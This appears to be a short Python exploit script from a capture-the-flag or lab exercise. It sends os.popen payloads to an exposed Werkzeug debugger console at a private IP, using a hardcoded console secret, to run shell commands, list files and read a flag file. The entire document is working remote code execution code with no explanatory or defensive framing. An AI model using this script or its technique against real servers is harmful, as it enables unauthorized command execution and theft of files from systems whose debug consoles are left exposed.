import requests

# URL for the console. Werkzeug requires a 'secret' or 's' parameter usually found in the page source.
target_url = "10.49.138.170:5000"

def execute_command(cmd):
    # This payload uses Python's os.popen to run system commands
    payload = f"__import__('os').popen('{cmd}').read()"
    params = {
        '__debugger__': 'yes',
        'cmd': payload,
        'frm': '0',
        's': 'AuUbQCo0pKx8exmiemGr' # Replace with the 'SECRET' found in your browser's page source
    }
    
    response = requests.get(target_url, params=params)
    return response.text

# Try to list files and read the flag
print("Files in directory:", execute_command("ls -la"))
print("Final Flag Content:", execute_command("cat flag.txt"))

